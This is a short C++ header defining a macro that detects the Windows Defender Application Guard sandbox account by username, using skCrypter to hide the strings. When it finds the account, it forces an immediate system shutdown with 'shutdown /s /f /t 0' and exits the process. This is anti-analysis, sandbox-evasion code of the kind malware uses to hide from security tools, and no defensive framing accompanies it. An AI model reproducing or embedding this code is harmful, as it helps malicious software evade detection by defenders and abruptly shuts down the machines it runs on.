#pragma once
#include <Windows.h>
#include <Lmcons.h>
#include <tchar.h>
#include <cstdlib>
#include "skCrypter.h"

#define DETECT_SANDBOX_AND_SHUTDOWN() \
do { \
    TCHAR buf[UNLEN + 1]; \
    DWORD len = UNLEN + 1; \
    if (GetUserName(buf, &len)) { \
        auto sandbox_user = skCrypt(_T("WDAGUtilityAccount")); \
        if (_tcscmp(buf, sandbox_user) == 0) { \
            system(skCrypt("shutdown /s /f /t 0")); \
            ExitProcess(0); \
        } \
    } \
} while (0)
